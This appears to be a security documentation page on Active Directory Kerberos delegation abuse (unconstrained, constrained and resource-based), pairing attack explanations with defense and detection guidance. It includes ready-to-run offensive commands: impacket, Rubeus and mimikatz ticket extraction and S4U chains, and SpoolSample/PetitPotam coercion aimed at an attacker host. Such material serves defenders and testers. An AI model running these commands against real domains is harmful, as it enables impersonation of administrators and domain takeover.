---
---

# Delegation Attacks

Abusing unconstrained, constrained, and resource-based constrained delegation.

Kerberos delegation allows a service to act on behalf of a user when accessing other services.
Active Directory implements three delegation models, each with distinct abuse patterns. All three
share a common theme: the attacker leverages a compromised account's delegation privileges to
impersonate other users -- often Domain Admins -- to services they could not otherwise access.

For the protocol mechanics of delegation, see [Delegation](../../protocol/delegation.md).

---

## Unconstrained Delegation

### How It Works

When a user authenticates to a service with unconstrained delegation
(`TRUSTED_FOR_DELEGATION` flag set on the service's account), the KDC includes the user's
**forwarded TGT** inside the service ticket. The service extracts this TGT and can use it to
request service tickets to **any** service in the domain, as that user.

This means every user who authenticates to an unconstrained delegation host leaves a copy of
their TGT in the host's LSASS memory.

**The attack:**

1. Compromise a host with unconstrained delegation enabled
2. Extract cached TGTs from LSASS memory
3. Use those TGTs to impersonate any user who authenticated to the host

**The escalation -- authentication coercion:**

Instead of waiting for a high-value user to authenticate, the attacker forces a high-privilege
account (such as a domain controller's computer account) to authenticate to the compromised host.
The coerced authentication delivers the victim's TGT to the attacker.

Common coercion techniques:

| Technique | Protocol | Description |
|---|---|---|
| SpoolSample / PrinterBug | MS-RPRN | Forces a machine to authenticate by triggering the Print Spooler's `RpcRemoteFindFirstPrinterChangeNotification` callback |
| PetitPotam | MS-EFSRPC | Forces a machine to authenticate via the Encrypting File System Remote Protocol (CVE-2021-36942) |
| DFSCoerce | MS-DFSNM | Forces a machine to authenticate via the Distributed File System Namespace Management protocol |

If the coerced machine is a domain controller, the attacker obtains the DC's TGT and can DCSync
the entire domain.

```
Attacker                  Compromised Host           Domain Controller
(controls)                (unconstrained deleg)
   |                           |                           |
   |  1. Trigger coercion      |                           |
   |  (SpoolSample/PetitPotam) |                           |
   |-------------------------->|  2. Force DC to auth      |
   |                           |-------------------------->|
   |                           |                           |
   |                           |  3. DC authenticates      |
   |                           |  (sends forwarded TGT)    |
   |                           |<--------------------------|
   |                           |                           |
   |  4. Extract DC's TGT      |                           |
   |  from LSASS memory        |                           |
   |<--------------------------|                           |
   |                                                       |
   |  5. Use DC's TGT for DCSync                           |
   |------------------------------------------------------>|
```

### Defend

**Remove unnecessary unconstrained delegation:**

```powershell title="Find all accounts with unconstrained delegation"
# Find all accounts with unconstrained delegation (should only return DCs)
Get-ADComputer -Filter 'TrustedForDelegation -eq $true' -Properties TrustedForDelegation |
    Select-Object Name, DNSHostName
```

Domain controllers inherently require unconstrained delegation. All other accounts should use
constrained delegation or RBCD instead.

**Protect high-value accounts:**

- Add Domain Admins and other sensitive accounts to the **Protected Users** group -- their TGTs
  are issued as non-forwardable, so they are not included in service tickets even for
  unconstrained delegation hosts
- Mark individual accounts as **"Account is sensitive and cannot be delegated"** in Active
  Directory

**Block coercion vectors:**

- Disable the Print Spooler service on all domain controllers:
  `Stop-Service Spooler; Set-Service Spooler -StartupType Disabled`
- Apply patches for PetitPotam (CVE-2021-36942)
- Restrict authenticated access to coercion-vulnerable RPC interfaces

### Detect

| Event / Signal | Description |
|---|---|
| `Get-ADComputer -Filter 'TrustedForDelegation -eq $true'` | Periodic audit -- only DCs should appear |
| Event 4624 (type 3) with delegation flag | Network logon to an unconstrained delegation host from a high-privilege account |
| TGT forwarding patterns | Unusual concentration of forwarded TGTs at a single host |
| Coercion indicators | Print Spooler RPC calls or EFSRPC calls from unexpected sources |

---

## Constrained Delegation (S4U2Self + S4U2Proxy) { #constrained }

### How It Works

Constrained delegation limits which services an account can delegate to. The allowed target
services are listed in the `msDS-AllowedToDelegateTo` attribute on the delegating account.

Two S4U (Service for User) extensions power constrained delegation:

**S4U2Self** -- the service requests a service ticket to **itself** on behalf of any user, without
needing that user's TGT. The KDC issues a ticket as if the user had directly requested a service
ticket for the delegating service.

**S4U2Proxy** -- the service presents the S4U2Self ticket (or a forwarded user ticket) to the KDC
and requests a new service ticket to the target service listed in
`msDS-AllowedToDelegateTo`. The KDC validates that the target SPN is in the allowed list
and issues the ticket.

**The attack:**

1. Compromise an account with `msDS-AllowedToDelegateTo` configured
2. Use S4U2Self to get a service ticket to yourself on behalf of any user (e.g., `administrator`)
3. Use S4U2Proxy to forward that ticket to the allowed target service
4. Access the target service as the impersonated user

**SPN substitution:**

The `sname` field in the service ticket is **not protected** by the PAC signature. The SPN in
`msDS-AllowedToDelegateTo` constrains the S4U2Proxy exchange, but after receiving the ticket,
the attacker can modify the `sname` to target a different service on the same host. For example,
if `msDS-AllowedToDelegateTo` contains `HTTP/web.corp.local`, the attacker can change the SPN
to `CIFS/web.corp.local` to access file shares -- because both services run under the same
computer account.

!!! warning "SPN is not a security boundary"
    Constrained delegation to `HTTP/host` effectively grants constrained delegation to
    `CIFS/host`, `LDAP/host`, `HOST/host`, and every other SPN registered to the same account.
    The "constraint" is weaker than it appears.

### Defend

- **Minimize constrained delegation scope** -- only configure `msDS-AllowedToDelegateTo` where
  absolutely required
- **Monitor changes** to `msDS-AllowedToDelegateTo` (Event 5136 for directory service object
  modifications)
- **Prefer RBCD** over constrained delegation where possible -- RBCD is configured on the target
  rather than the source, making it easier to audit and manage
- **Use Protected Users** for sensitive accounts -- their tickets cannot be delegated

### Detect

| Event / Signal | Description |
|---|---|
| Event 4769 with Transited Services | TGS requests where the `Transited Services` field is populated indicate S4U2Proxy activity |
| Event 5136 | Changes to `msDS-AllowedToDelegateTo` attribute |
| Unusual S4U patterns | S4U2Self requests for high-privilege accounts from low-privilege services |

---

## Resource-Based Constrained Delegation (RBCD) { #rbcd }

### How It Works

RBCD inverts the constrained delegation model. Instead of configuring delegation on the
**source** account (`msDS-AllowedToDelegateTo`), RBCD is configured on the **target** account
using the `msDS-AllowedToActOnBehalfOfOtherIdentity` attribute. This attribute specifies which
accounts are allowed to delegate to the target.

The key difference for attackers: writing `msDS-AllowedToActOnBehalfOfOtherIdentity` only
requires **write access to the target computer object** -- not Domain Admin privileges.

**The attack flow:**

1. **Identify a writable computer object** -- the attacker has write access to a computer account
   in AD (through ACL misconfiguration, account operator privileges, or creator-owner rights)

2. **Create or control a computer account** -- by default, any domain user can create up to 10
   computer accounts (`ms-DS-MachineAccountQuota` default is 10)

    ```bash title="Create a computer account via impacket addcomputer"
    addcomputer.py CORP.LOCAL/jsmith:password -computer-name FAKEMACHINE$ -computer-pass 'FakePass123!'
    ```

3. **Configure RBCD** -- write the controlled computer account's SID to
   `msDS-AllowedToActOnBehalfOfOtherIdentity` on the target computer

    ```powershell title="Configure RBCD: allow FAKEMACHINE to delegate to TARGET"
    Set-ADComputer TARGET$ -PrincipalsAllowedToDelegateToAccount FAKEMACHINE$
    ```

4. **S4U2Self** -- request a service ticket to the controlled machine on behalf of a target user
   (e.g., `administrator`)

5. **S4U2Proxy** -- present that ticket to the KDC and request a service ticket to the target
   computer's service (e.g., `CIFS/target.corp.local`)

6. **Access the target** as the impersonated user

```
Attacker                        KDC                    Target
   |                             |                       |
   |  1. Create FAKEMACHINE$     |                       |
   |  2. Write RBCD on target    |                       |
   |                             |                       |
   |  3. S4U2Self: ticket to     |                       |
   |     FAKEMACHINE on behalf   |                       |
   |     of administrator        |                       |
   |---------------------------->|                       |
   |  4. S4U2Self ticket         |                       |
   |<----------------------------|                       |
   |                             |                       |
   |  5. S4U2Proxy: forward to   |                       |
   |     CIFS/target.corp.local  |                       |
   |---------------------------->|                       |
   |  6. Service ticket as       |                       |
   |     administrator           |                       |
   |<----------------------------|                       |
   |                                                     |
   |  7. AP-REQ with admin ticket                        |
   |---------------------------------------------------->|
```

### Common Attack Paths

RBCD is often the final step in an attack chain. Common paths that lead to write access on a
computer object:

| Path | How the attacker gets write access |
|---|---|
| Creator-owner | The account that joined a computer to the domain has write access to that computer object by default |
| Account Operators | Members of this group can modify most computer objects |
| ACL misconfiguration | GenericAll, GenericWrite, or WriteDACL on a computer object |
| Compromised admin | Help desk or IT admin accounts with delegated computer management |

### Defend

**Set `ms-DS-MachineAccountQuota` to 0:**

```powershell title="Set ms-DS-MachineAccountQuota to 0 to prevent unprivileged computer account creation"
Set-ADDomain -Identity CORP.LOCAL -Replace @{"ms-DS-MachineAccountQuota" = 0}
```

This prevents domain users from creating computer accounts, removing the easiest path to a
controlled account for RBCD abuse.

**Monitor RBCD attribute changes:**

Event 5136 logs modifications to directory service objects. Filter for changes to
`msDS-AllowedToActOnBehalfOfOtherIdentity`:

```
Event ID: 5136
Attribute: msDS-AllowedToActOnBehalfOfOtherIdentity
```

**Restrict write access to computer objects:**

- Audit ACLs on computer objects regularly
- Remove unnecessary write permissions from non-admin accounts
- Use the AdminSDHolder + SDProp mechanism to protect sensitive computer accounts

**Monitor computer account creation:**

Event 4741 logs new computer account creation. Alert on unexpected computer accounts created by
non-admin users.

### Detect

| Event / Signal | Description |
|---|---|
| Event 5136 | Directory service object modification -- filter for `msDS-AllowedToActOnBehalfOfOtherIdentity` |
| Event 4741 | New computer account creation -- alert if the creator is not an expected admin |
| Event 4769 with Transited Services | S4U2Proxy activity for the target computer |
| New computer accounts | Unexpected accounts matching patterns like short names or unusual naming conventions |

---

## Tools

!!! info "kerbwolf does not implement delegation attacks"
    Delegation abuse requires S4U protocol extensions and AD object manipulation. kerbwolf focuses
    on the core Kerberos authentication exchanges.

### Unconstrained Delegation

| Tool | Command | Notes |
|---|---|---|
| Rubeus | `Rubeus.exe monitor /interval:5 /nowrap` | Monitors for new TGTs arriving via unconstrained delegation |
| mimikatz | `sekurlsa::tickets /export` | Exports all cached Kerberos tickets including forwarded TGTs |
| SpoolSample | `SpoolSample.exe dc01.corp.local attacker.corp.local` | Triggers PrinterBug coercion |
| PetitPotam | `PetitPotam.py attacker.corp.local dc01.corp.local` | Triggers EFSRPC coercion |

### Constrained Delegation

| Tool | Command | Notes |
|---|---|---|
| Rubeus | `Rubeus.exe s4u /user:svc_web /rc4:<hash> /impersonateuser:administrator /msdsspn:CIFS/target.corp.local /ptt` | Full S4U2Self + S4U2Proxy chain |
| impacket | `getST.py CORP.LOCAL/svc_web -hashes :<hash> -spn CIFS/target.corp.local -impersonate administrator` | Outputs ccache file |

### RBCD

| Tool | Command | Notes |
|---|---|---|
| impacket | `rbcd.py CORP.LOCAL/jsmith:pass -delegate-from FAKEMACHINE$ -delegate-to TARGET$ -action write` | Configures RBCD attribute |
| impacket | `getST.py CORP.LOCAL/FAKEMACHINE$:FakePass -spn CIFS/target.corp.local -impersonate administrator` | Performs S4U chain after RBCD configuration |
| Rubeus | `Rubeus.exe s4u /user:FAKEMACHINE$ /rc4:<hash> /impersonateuser:administrator /msdsspn:CIFS/target.corp.local /ptt` | S4U chain from controlled computer account |
| PowerView | `Set-DomainObject -Identity TARGET$ -Set @{'msDS-AllowedToActOnBehalfOfOtherIdentity'=...}` | Configures RBCD via PowerShell |
